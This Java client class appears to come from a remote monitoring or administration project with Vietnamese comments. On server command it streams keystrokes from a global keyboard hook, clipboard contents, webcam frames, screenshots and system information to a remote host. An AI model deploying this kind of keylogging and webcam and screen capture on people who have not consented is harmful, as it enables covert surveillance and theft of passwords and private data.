package client;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import core.*;
import core.model.Action;
import core.model.StringMat;
import core.system.SystemInfo;
import org.opencv.core.Mat;
import org.opencv.videoio.VideoCapture;

import java.awt.*;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.Transferable;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

public class ClientSession extends Session {
    private Thread threadSystemInfo;
    private String id;
    private ClipboardListener clipboardListener;
    private KeyboardListener keyboardListener;
    private ObjectMapper mapper;

    public ClientSession(Socket skConnect) throws IOException {
        super(skConnect);
        mapper = new ObjectMapper();
        Core.writeString(writerConnect, UtilContent.client);
        //send name PC
        oshi.SystemInfo si = new oshi.SystemInfo();
        String hostName = si.getOperatingSystem().getNetworkParams().getHostName();
        Core.writeString(writerConnect, hostName);
        //Nhận id từ server
        id = readerConnect.readLine();
        //Dang ky lang nghe key
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    public void createConnectSystemInfo() throws IOException {
        skSystemInfo = new Socket(UtilContent.address, UtilContent.port);
        createBufferedSystemInfo();
        Action action = new Action(UtilContent.createConnectSystemInfo, id);
        String stringAction = mapper.writeValueAsString(action);
        Core.writeString(writerSystemInfo, stringAction);
        sendSystemInfo(writerSystemInfo, readerSystemInfo);
    }

    private void createConnectCamera() throws IOException {
        skCamera = new Socket(UtilContent.address, UtilContent.port);
        createBufferedCamera();
        Action action = new Action(UtilContent.createConnectCamera, id);
        String stringAction = mapper.writeValueAsString(action);
        Core.writeString(writerCamera, stringAction);
    }

    private void createConnectScreens() throws IOException {
        skScreens = new Socket(UtilContent.address, UtilContent.port);
        createBufferedScreens();
        Action action = new Action(UtilContent.createConnectScreens, id);
        String stringAction = mapper.writeValueAsString(action);
        Core.writeString(writerScreens, stringAction);
    }

    private void createConnectClipboard() throws IOException {
        skClipboard = new Socket(UtilContent.address, UtilContent.port);
        createBufferedClipboard();
        Action action = new Action(UtilContent.createConnectClipboard, id);
        String stringAction = mapper.writeValueAsString(action);
        Core.writeString(writerClipboard, stringAction);
    }

    private void createConnectKeyboard() throws IOException {
        skKeyboard = new Socket(UtilContent.address, UtilContent.port);
        createBufferedKeyboard();
        Action action = new Action(UtilContent.createConnectKeyboard, id);
        String stringAction = mapper.writeValueAsString(action);
        Core.writeString(writerKeyboard, stringAction);
    }

    private void disconnect() {
        interrupt();
    }

    private void shutdown() {
        interrupt();
        System.out.println("Shutdown");
        /*try {
            ProcessManager.shutDown();
        } catch (Exception e) {
            e.printStackTrace();
        }*/
    }

    private void killProcess(String pid) {
        System.out.println("Kill" + pid);
        /*try {
            ProcessManager.killProcess(Integer.parseInt(pid));
        } catch (Exception e) {
            e.printStackTrace();
        }*/
    }

    public void sendRequest(String stringAction){
        try {
            Core.writeString(writerConnect, stringAction);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void stopClipboard() {
        //Gắn false để dừng theo dõi clipboard
        if(clipboardListener != null){
            clipboardListener.run = false;
            clipboardListener = null;
            resetClipboard();
            System.out.println("Stopped clipboard.");
        }
    }

    private void stopKeyboard() {
        if(keyboardListener != null){
            try {
                keyboardListener.unregister();
                keyboardListener = null;
                resetKeyboard();
                System.out.println("Stopped keyboard.");
            } catch (NativeHookException e) {
                e.printStackTrace();
            }
        }
    }

    public void sendSystemInfo(BufferedWriter writer, BufferedReader reader) throws IOException {
        oshi.SystemInfo si = new oshi.SystemInfo();
        SystemInfo systemInfo = new SystemInfo(si);
        threadSystemInfo = new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        systemInfo.refresh();
                        String dataSystem = mapper.writeValueAsString(systemInfo);
                        Core.writeString(writer, dataSystem);

                        String feedback = reader.readLine();
                        if (feedback.equals(UtilContent.continues)) {
                            Thread.sleep(UtilContent.timeSystemInfo);
                        }
                    } catch (IOException | InterruptedException e) {
                        e.printStackTrace();
                        System.out.println("SystemInfo stopped.");
                        return;
                    }
                }
            }
        });

        String wait = reader.readLine();
        if (wait.equals(UtilContent.systemForwardReady)) {
            threadSystemInfo.start();
        }
    }

    public static void cameraStart(BufferedWriter writer) {
        VideoCapture videoCapture = new VideoCapture();
        Mat frame = new Mat();
        videoCapture.open(0);
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                System.out.println("Camera start...");
                while (true) {
                    try {
                        videoCapture.read(frame);
                        StringMat stringMat = new StringMat(frame);
                        String dataCamera = new ObjectMapper().writeValueAsString(stringMat);
                        Core.writeString(writer, dataCamera);

                        Thread.sleep(UtilContent.timeCamera);

                    } catch (InterruptedException | IOException e) {
                        e.printStackTrace();
                        if (videoCapture.isOpened()) {
                            videoCapture.release();
                        }
                        System.out.println("Camera stop...");
                        return;
                    }
                }
            }
        });
        thread.start();
    }

    public void screensStart(BufferedWriter writer) {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            Thread thread = new Thread(new Runnable() {
                @Override
                public void run() {
                    System.out.println("Record start...");
                    while (true) {
                        BufferedImage screenshot = robot.createScreenCapture(screenRect);
                        try {
                            Core.paintCursor(screenshot);
                            Mat mat = Core.bufferedImageToMat(screenshot);
                            StringMat stringMat = new StringMat(mat);
                            String dataScreens = mapper.writeValueAsString(stringMat);
                            Core.writeString(writer, dataScreens);

                            TimeUnit.MICROSECONDS.sleep(10);
                        } catch (IOException | InterruptedException e) {
                            e.printStackTrace();
                            System.out.println("Screens record stop.");
                            return;
                        }
                    }
                }
            });
            thread.start();
        } catch (AWTException e) {
            e.printStackTrace();
            System.out.println("Can not create robot!");
        }
    }

    private void clipboardListen(BufferedWriter writerClipboard) {
        System.out.println("Clipboard start...");
        clipboardListener = new ClipboardListener(new ClipboardListener.ClipboardChange() {
            @Override
            public void onChange(Transferable transferable) {
                try {
                    String data = (String) (transferable.getTransferData(DataFlavor.stringFlavor));
                    Action action = new Action(UtilContent.sendTypeString, data);
                    String stringAction = mapper.writeValueAsString(action);
                    Core.writeString(writerClipboard, stringAction);
                } catch (Exception e) {
                    try {
                        BufferedImage bufferedImage = (BufferedImage) transferable.getTransferData(DataFlavor.imageFlavor);
                        String data = Core.bufferedImageToString(bufferedImage);
                        Action action = new Action(UtilContent.sendTypeImage, data);
                        String stringAction = mapper.writeValueAsString(action);
                        Core.writeString(writerClipboard, stringAction);
                    } catch (UnsupportedFlavorException ex) {
                        System.out.println("Not string or image UnsupportedFlavorException");
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                }
            }

            @Override
            public void onClose() {
                sendRequest(UtilContent.onCloseClipboard);
                System.out.println("Lost clipboard");
            }
        });
    }

    private void keyboardListen(BufferedWriter writerKeyboard) {
        System.out.println("Keyboard start...");
        keyboardListener = new KeyboardListener(new KeyboardListener.KeyboardPress() {
            @Override
            public void onPress(String data) {
                try {
                    Core.writeString(writerKeyboard, data);
                } catch (JsonProcessingException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    @Override
    public void run() {
        super.run();
        System.out.println("Client start...");
        try {
            while (true) {
                String stringAction = readerConnect.readLine();
                if (stringAction.equals(UtilContent.createConnectSystemInfo)) {
                    createConnectSystemInfo();
                    System.out.println("SystemInfo running...");
                } else if (stringAction.equals(UtilContent.reset)) {
                    //Yêu cầu reset từ server khi mat ket not admin hoac thay doi user tren admin
                    stopClipboard();
                    stopKeyboard();
                    threadSystemInfo.interrupt();
                    closeSocket();
                    System.out.println("Wait...");
                } else if (stringAction.equals(UtilContent.createConnectCamera)) {
                    createConnectCamera();
                    cameraStart(writerCamera);
                } else if (stringAction.equals(UtilContent.stopCamera)) {
                    resetCamera();
                } else if (stringAction.equals(UtilContent.createConnectScreens)) {
                    createConnectScreens();
                    screensStart(writerScreens);
                } else if (stringAction.equals(UtilContent.stopScreens)) {
                    resetScreens();
                } else if (stringAction.equals(UtilContent.disconnect)) {
                    //Yêu cầu disconnect từ admin
                    stopClipboard();
                    stopKeyboard();
                    try {
                        GlobalScreen.unregisterNativeHook();
                    } catch (NativeHookException e) {
                        e.printStackTrace();
                    }
                    disconnect();
                } else if (stringAction.equals(UtilContent.shutdown)) {
                    stopClipboard();
                    stopKeyboard();
                    try {
                        GlobalScreen.unregisterNativeHook();
                    } catch (NativeHookException e) {
                        e.printStackTrace();
                    }
                    shutdown();
                } else if (stringAction.equals(UtilContent.createConnectClipboard)) {
                    createConnectClipboard();
                    clipboardListen(writerClipboard);
                } else if (stringAction.equals(UtilContent.stopClipboard)) {
                    stopClipboard();
                } else if (stringAction.equals(UtilContent.createConnectKeyboard)) {
                    createConnectKeyboard();
                    keyboardListen(writerKeyboard);
                } else if (stringAction.equals(UtilContent.stopKeyboard)) {
                    stopKeyboard();
                } else {
                    Action action = mapper.readerFor(Action.class).readValue(stringAction);
                    switch (action.getAction()) {
                        case UtilContent.killProcess: {
                            killProcess((String) action.getData());
                        }
                    }
                }

            }

        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
